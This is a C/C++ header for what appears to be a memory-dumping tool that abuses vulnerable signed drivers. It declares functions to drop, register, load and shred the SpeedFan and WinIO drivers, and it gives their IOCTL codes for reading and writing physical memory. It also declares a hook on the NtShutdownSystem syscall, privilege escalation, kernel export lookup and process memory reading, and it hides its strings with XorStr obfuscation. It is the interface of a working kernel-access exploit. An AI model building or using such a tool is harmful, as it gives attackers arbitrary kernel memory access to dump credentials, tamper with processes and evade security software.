#ifndef DM_H
# define DM_H

# include "dm_structs.h"
# include "AxiomDumper.h"
# include "autoxor.h"

# define SYSCALL_HOOK XorStr("NtShutdownSystem")
# define SYSCALL_DLL XorStr("ntdll.dll")

extern void* g_syscall_address;
extern HANDLE g_drv_handle;
extern BOOL(*g_read_phys)(void* addr, void* buffer, std::size_t size);
extern BOOL(*g_write_phys)(void* addr, void* buffer, std::size_t size);
extern PAXIOM_OPTIONS g_options;

void DM_LoadFramework();
void DM_SetNtoskrnlBaseAddress(PVOID address);
DWORD64 DM_FindNtoskrnlBaseAddress(void);
void DM_GetKrnlVersion(char* buffer, SIZE_T bufferLen, CHAR* filename);
void DM_PrivIncrease();
void DM_DropDriverToDisk(AXIOM_DRIVER driver, const char* drv_name);
void DM_ShredAndDeleteDriver(AXIOM_DRIVER driver, const char* drv_name);
NTSTATUS DM_AddDriverViaRegistry(const char* drv_name);
BOOL DM_LoadDriver(const char* drv_name);
BOOL DM_UnloadDriver(const char* drv_name);
void* DM_GetKernelExportAddress(ULONGLONG kernelBaseAddress, const char* ntoskrnl_version, DWORD exportType);
HANDLE DM_SpawnHandle(ULONG pid);
void DM_ReadVirtualMemory(HANDLE hProcess, ULONGLONG targetAddress, PVOID buffer, SIZE_T size);
ULONGLONG DM_GetProcessPEB(ULONG pid);
NTSTATUS DM_QueryVirtualMemory(HANDLE hProcess, PVOID64 baseAddress, PMEMORY_BASIC_INFORMATION pmbi);

typedef struct _IOCTL_PHYMEM_READ_CMD {
    ULONGLONG sourceAddress;
} IOCTL_PHYMEM_READ_CMD, * PIOCTL_PHYMEM_READ_CMD;

#pragma pack(push,1)
typedef struct _IOCTL_WINIO_PHYMEM_READ_CMD
{
    uint64_t size;
    uint64_t addr;
    uint64_t unk1;
    uint64_t outPtr;
    uint64_t unk2;
} IOCTL_WINIO_PHYMEM_READ_CMD, *PIOCTL_WINIO_PHYMEM_READ_CMD;
#pragma pack(pop)

/*
* ================================================================================
* |                                   SPEEDFAN                                   |
* ================================================================================
*/
# define SPEEDFAN_DEVICE_NAME L"SpeedFan"
# define SPEEDFAN_DEVICE_PATH L"\\\\.\\" SPEEDFAN_DEVICE_NAME
# define IOCTL_PHYMEM_READ 0x9c402428
# define IOCTL_PHYMEM_WRITE 0x9c40242c
# define IOCTL_WINIO_PHYMEM_MAP 0x80102040
# define IOCTL_WINIO_PHYMEM_UNMAP 0x80102044
HANDLE SPEEDFAN_load_drv();
BOOL SPEEDFAN_write_phys(void* addr, void* buffer, std::size_t size);
BOOL SPEEDFAN_read_phys(void* addr, void* buffer, std::size_t size);
HANDLE WINIO_load_drv();
BOOL WINIO_read_phys(void* addr, void* buffer, std::size_t size);
BOOL WINIO_write_phys(void* addr, void* buffer, std::size_t size);

#endif

